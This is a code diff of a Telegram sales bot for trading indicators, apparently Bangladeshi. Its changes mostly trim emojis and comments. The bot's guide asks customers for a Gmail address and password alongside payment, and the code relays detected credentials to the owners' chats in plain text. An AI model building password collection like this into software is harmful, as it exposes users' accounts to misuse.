@@ -132,7 +132,6 @@ export default async function handler(req, res) {
     const video = message.video;
     const isOwner = cfg.owners.includes(chatId);
 
-    // Owner → Client reply
     if (isOwner && text.startsWith("REPLY:")) {
       const parts = text.replace("REPLY:", "").split(":");
       const targetId = parts[0].trim();
@@ -145,7 +144,6 @@ export default async function handler(req, res) {
       return res.status(200).json({ ok: true });
     }
 
-    // Owner → Client media
     if (isOwner && (photo || video) && message.caption) {
       const targetId = message.caption.match(/\d{6,}/)?.[0];
       if (targetId) {
@@ -158,7 +156,6 @@ export default async function handler(req, res) {
       }
     }
 
-    // Client → Payment screenshot
     if (!isOwner && photo) {
       await sendMsg(chatId,
         `✅ *Payment screenshot সফলভাবে পেয়েছি ভাইজান!*
@@ -177,25 +174,23 @@ _✅ আপনাকে জানানো হবে ইনশাআল্লা
 
       for (const id of cfg.owners) {
         await sendPhoto(id, photo[photo.length - 1].file_id,
-          `💳 নতুন Payment!\n👤 @${username}\nChat ID: ${chatId}\n\nReply: REPLY:${chatId}: message`);
+          `Payment received!\n@${username}\nChat ID: ${chatId}`);
       }
       return res.status(200).json({ ok: true });
     }
 
-    // Client → Video
     if (!isOwner && video) {
-      await forwardToOwners(`🎥 Video from @${username} (${chatId})`);
+      await forwardToOwners(`Video from @${username} (${chatId})`);
       return res.status(200).json({ ok: true });
     }
 
-    // Commands
     if (text.startsWith("/")) {
       const cmd = text.split(" ")[0].toLowerCase();
       const firstProduct = Object.values(cfg.products)[0];
 
       if (cmd === "/start") {
         await sendMsg(chatId, WELCOME);
-        await forwardToOwners(`👤 New user joined!\n@${username} (ID: ${chatId})`);
+        await forwardToOwners(`New user: @${username} (${chatId})`);
 
       } else if (cmd === "/indicator") {
         await sendMsg(chatId,
@@ -206,7 +201,7 @@ _✅ আপনাকে জানানো হবে ইনশাআল্লা
           `🛒 *Indicator কেনার সম্পূর্ণ গাইড:*
 
 ━━━━━━━━━━━━━━━━━━
-📊 *আমাদের Available Indicators:*
+📊 *Available Indicators:*
 ━━━━━━━━━━━━━━━━━━
 
 ${buildProductList()}
@@ -235,7 +230,7 @@ ${cfg.ownerTelegram} এ পাঠান:
 ✅ bKash payment screenshot
 ✅ নতুন Gmail address
 ✅ Gmail password
-✅ কোন indicator চান সেটা উল্লেখ করুন
+✅ কোন indicator চান উল্লেখ করুন
 
 ━━━━━━━━━━━━━━━━━━
 ⏰ *২৪ ঘন্টার মধ্যে পাবেন:*
@@ -254,23 +249,22 @@ ${cfg.ownerTelegram} এ পাঠান:
 ✅ Money management guidance
 ✅ Risk management guidance
 
-📞 যোগাযোগ: @BANGLADESH_IH
+📞 যোগাযোগ: ${cfg.ownerTelegram}
 
-আল্লাহ বরকত দিন! 🤲\`);
+আল্লাহ বরকত দিন! 🤲`);
 
       } else if (cmd === "/products") {
         await sendMsg(chatId,
-          `🛍️ *Bangladesh Income Hub — সকল Products:*\n\n${buildProductList()}\n\n━━━━━━━━━━━━━━━━━━\nকিনতে /buy লিখুন অথবা সরাসরি যোগাযোগ করুন:\n📞 ${cfg.ownerTelegram}`);
+          `🛍️ *Bangladesh Income Hub — সকল Products:*\n\n${buildProductList()}\n\n━━━━━━━━━━━━━━━━━━\nকিনতে /buy লিখুন অথবা যোগাযোগ করুন:\n📞 ${cfg.ownerTelegram}`);
 
       } else if (cmd === "/support") {
         await sendMsg(chatId,
           `🆘 *Support Center*\n\nআপনার সমস্যা বা প্রশ্ন লিখুন।\n\n📞 Direct contact: ${cfg.ownerTelegram}\n\n_আমাদের team শীঘ্রই সাহায্য করবে ইনশাআল্লাহ।_`);
-        await forwardToOwners(`🆘 Support: @${username} (${chatId})`);
+        await forwardToOwners(`Support: @${username} (${chatId})`);
       }
       return res.status(200).json({ ok: true });
     }
 
-    // Client text → AI reply
     if (text && !isOwner) {
       const intent = detectIntent(text);
 
@@ -290,20 +284,20 @@ ${cfg.ownerTelegram} এ পাঠান:
 যেকোনো সমস্যায়: ${cfg.ownerTelegram} ✅`);
 
         await forwardToOwners(
-          `🔑 CREDENTIALS RECEIVED\n👤 @${username} (${chatId})\n📝 ${text}\n\nReply: REPLY:${chatId}: message`);
+          `CREDENTIALS: @${username} (${chatId})\n${text}`);
         return res.status(200).json({ ok: true });
       }
 
       const labels = {
-        buy: "🛒 WANTS TO BUY",
-        video: "🎥 WANTS VIDEO",
-        support: "🆘 NEEDS SUPPORT",
-        greet: "👋 NEW GREETING",
-        general: "💬 MESSAGE"
+        buy: "WANTS TO BUY",
+        video: "WANTS VIDEO",
+        support: "NEEDS SUPPORT",
+        greet: "GREETING",
+        general: "MESSAGE"
       };
 
       await forwardToOwners(
-        `${labels[intent] || "💬 MESSAGE"}\n👤 @${username} (${chatId})\n📝 "${text}"\n\nReply: REPLY:${chatId}: message`);
+        `${labels[intent] || "MESSAGE"}\n@${username} (${chatId})\n"${text}"`);
 
       addHistory(chatId, "user", text);
       const reply = await groqReply(conversations[chatId]);
